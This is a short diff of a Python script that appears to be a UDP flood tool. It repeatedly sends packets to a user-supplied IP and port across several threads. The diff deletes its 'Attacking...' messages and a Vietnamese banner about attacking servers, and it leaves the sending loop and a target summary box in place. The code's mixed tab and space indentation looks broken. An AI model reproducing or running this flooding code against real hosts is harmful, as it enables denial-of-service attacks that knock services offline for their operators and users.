@@ -30,8 +30,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(Fore.LIGHTRED_EX+"Attacking...")
-    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever l: ")
+			
     print("╔═════════════════")
     print(f"║ IP    : {ip}   ")
     print(f"║ Port  : {port} ")
@@ -39,8 +38,7 @@ def run():
     print(f"║ Threads : {threads} ")  
     print("╚═════════════════")
 		except:
-			 print(Fore.LIGHTRED_EX+"Attacking...")
-    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+			 
     print("╔═════════════════")
     print(f"║ IP    : {ip}   ")
     print(f"║ Port  : {port} ")
